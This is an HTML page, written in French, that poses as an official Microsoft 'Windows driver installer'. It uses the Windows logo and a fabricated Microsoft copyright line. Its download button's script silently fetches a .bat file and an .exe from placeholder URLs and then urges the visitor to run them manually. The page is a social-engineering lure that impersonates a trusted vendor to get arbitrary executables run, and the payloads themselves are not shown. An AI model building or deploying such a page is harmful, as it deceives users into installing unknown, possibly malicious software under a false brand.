<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Installateur de Drivers Windows</title>
    <style>
        /* Corps de la page */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #2a2a72, #009ffd);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Conteneur principal */
        .container {
            text-align: center;
            background: #fff;
            border-radius: 12px;
            padding: 40px;
            width: 90%;
            max-width: 600px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
            color: #333;
        }

        /* En-tête */
        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        p {
            font-size: 1rem;
            line-height: 1.6;
            color: #555;
        }

        /* Bouton de téléchargement */
        .download-btn {
            display: inline-block;
            margin-top: 20px;
            padding: 15px 30px;
            font-size: 1.2rem;
            font-weight: bold;
            color: #fff;
            background: #009ffd;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.3s ease;
        }

        .download-btn:hover {
            background: #007bb5;
        }

        /* Icône de Windows */
        .icon {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
        }

        /* Pied de page */
        .footer {
            margin-top: 30px;
            font-size: 0.9rem;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg" alt="Windows Logo" class="icon">
        <h1>Installateur de Drivers Windows</h1>
        <p>Installez facilement les derniers drivers pour votre système Windows. Cliquez sur le bouton ci-dessous pour démarrer le processus d'installation.</p>
        <a href="#" class="download-btn" id="download-btn">Télécharger les Drivers</a>
        <div class="footer">
            © 2025 Microsoft Corporation. Tous droits réservés.
        </div>
    </div>

    <script>
        document.getElementById("download-btn").addEventListener("click", () => {
            const files = [
                "https://votre-site.com/chemin/vers/votre-script.bat",
                "https://votre-site.com/chemin/vers/votre-programme.exe"
            ];

            files.forEach(file => {
                const a = document.createElement("a");
                a.href = file;
                a.download = file.split("/").pop(); // Nom du fichier extrait de l'URL
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            });

            alert("Les fichiers ont été téléchargés. Veuillez les exécuter manuellement.");
        });
    </script>
</body>
</html>
